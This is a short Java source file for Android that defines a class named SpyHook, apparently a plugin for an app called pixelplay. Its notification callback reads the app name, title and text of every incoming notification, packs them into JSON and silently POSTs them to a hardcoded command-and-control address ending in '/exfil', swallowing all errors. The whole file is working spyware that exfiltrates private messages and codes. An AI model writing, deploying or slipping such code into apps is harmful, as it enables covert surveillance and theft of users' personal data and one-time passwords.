package com.pixelplay.hook;

import android.os.Bundle;
import android.service.notification.StatusBarNotification;

import com.pixelplay.app.Hook;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SpyHook implements Hook {
    private static final String C2 = "http://192.168.100.2:8080/exfil";

    @Override
    public void onNotification(StatusBarNotification sbn) {
        try {
            Bundle extras = sbn.getNotification().extras;
            String pkg = sbn.getPackageName();
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");

            StringBuilder sb = new StringBuilder();
            sb.append("{\"package\":\"").append(esc(pkg)).append("\"");
            sb.append(",\"title\":\"").append(esc(title)).append("\"");
            sb.append(",\"text\":\"").append(esc(text)).append("\"");
            sb.append(",\"time\":").append(System.currentTimeMillis());
            sb.append("}");

            URL url = new URL(C2);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            OutputStream os = conn.getOutputStream();
            os.write(sb.toString().getBytes("UTF-8"));
            os.flush();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
